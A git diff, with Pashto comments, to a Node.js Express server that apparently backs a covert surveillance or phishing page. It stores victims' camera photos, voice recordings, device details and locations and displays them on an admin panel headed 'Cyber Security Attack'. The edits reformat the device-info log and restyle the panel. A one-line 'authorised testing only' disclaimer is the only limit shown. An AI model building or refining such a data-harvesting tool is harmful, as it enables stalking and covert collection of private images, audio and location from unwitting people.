@@ -45,12 +45,15 @@ app.get('/', (req, res) => {
 });
 
 app.post('/', upload.fields([{ name: 'photo' }, { name: 'voice' }]), (req, res) => {
-    // ۱. د موبایل معلوماتو خوندي کول
+    // ۱. د موبایل د معلوماتو ساده او پاک خوندي کول
     if (req.body.device_info) {
         try {
             const info = JSON.parse(req.body.device_info);
             const time = new Date().toISOString().replace(/T/, ' ').replace(/\..+/, '');
-            const entry = `نېټه: ${time} | بروزر/سیسټم: ${info.userAgent} | پلیټ فارم: ${info.platform} | سکرین: ${info.screenSize} | د بیټرۍ کچه: ${info.batteryLevel} | ژبه: ${info.language}\n-----------------------------------\n`;
+            
+            // دلته شکل په بشپړ ډول د ستاسو د غوښتنې سره سم پاک شو
+            const entry = `📅 نېټه: ${time}\n📱 د وسیلې ډول: ${info.deviceType}\n🔢 د انډرایډ ورژن: ${info.androidVer}\n📐 د سکرین اندازه: ${info.screenSize}\n🔋 د بیټرۍ چارج: ${info.batteryLevel}\n🌐 د براوزر ژبه: ${info.language}\n-----------------------------------\n`;
+            
             fs.appendFileSync(path.join(deviceInfoDir, 'device_info.txt'), entry, 'utf8');
             return res.send("Device Info Saved");
         } catch (e) {}
@@ -106,14 +109,13 @@ app.get('/admin', (req, res) => {
         return res.redirect('/admin');
     }
 
-    // د موبایل معلوماتو لوستل
     let deviceInfoHtml = '<p>تاسې تر اوسه د موبایل کوم معلومات نه دي ترلاسه کړي.</p>';
     let deleteDevBtn = '';
     const devPath = path.join(deviceInfoDir, 'device_info.txt');
     if (fs.existsSync(devPath)) {
         deleteDevBtn = `<a href="/admin?delete=device_info" class="delete-btn" onclick="return confirm('ټول معلومات پاک شي؟')">ټول پاکول</a>`;
         const content = fs.readFileSync(devPath, 'utf8');
-        deviceInfoHtml = `<pre style="white-space: pre-wrap; font-size: 13px; color: #333; background: #fafafa; padding: 10px; border-radius: 5px; max-height: 200px; overflow-y: auto;">${content}</pre>`;
+        deviceInfoHtml = `<pre style="white-space: pre-wrap; font-size: 14px; color: #111; background: #fafafa; padding: 12px; border-radius: 6px; max-height: 250px; overflow-y: auto; font-family: monospace; line-height: 1.5;">${content}</pre>`;
     }
 
     let locationsHtml = '<p>تر اوسه کوم لوکیشن نه دی ثبت شوی.</p>';
@@ -195,7 +197,7 @@ app.get('/admin', (req, res) => {
             <div class="welcome-title">🛡️ Welcome to Cyber Security Attack ⚡</div>
             <p style="text-align: center; font-weight: bold; color: #25D366; margin: 5px 0;">🔰 د برنامې هرکلی!</p>
             <div class="welcome-msg">
-                ⚠️ <strong>مهمه خبرتیا:</strong> دا اپلیکیشن یوازې د مجازو امنیتي ازموینو او مهمو اهدافو لپاره شوی دی.<br><br>
+                ⚠️ <strong>مهمه خبرتیا:</strong> دا اپلیکیشن یوازې د مجازو امنیتي ازموینو لپاره دی.<br><br>
                 👨‍💻 <strong>درنښت، اډمین:</strong> @Mastershahzada
             </div>
             <a href="/admin?action=enter" class="enter-btn">سیستم ته ننوتل 🚀</a>
@@ -211,7 +213,7 @@ app.get('/admin', (req, res) => {
         <h2>📸 اخیستل شوي عکسونه: ${deleteAllPhotosBtn}</h2>
         <div class="card grid">${photosHtml}</div>
 
-        <h2>🎙️ ریکارډ شوي غږونه (مک):</h2>
+        <h2>🎙️ ریکارډ شوي غږونه:</h2>
         <div class="card">${voicesHtml}</div>`;
     }
 
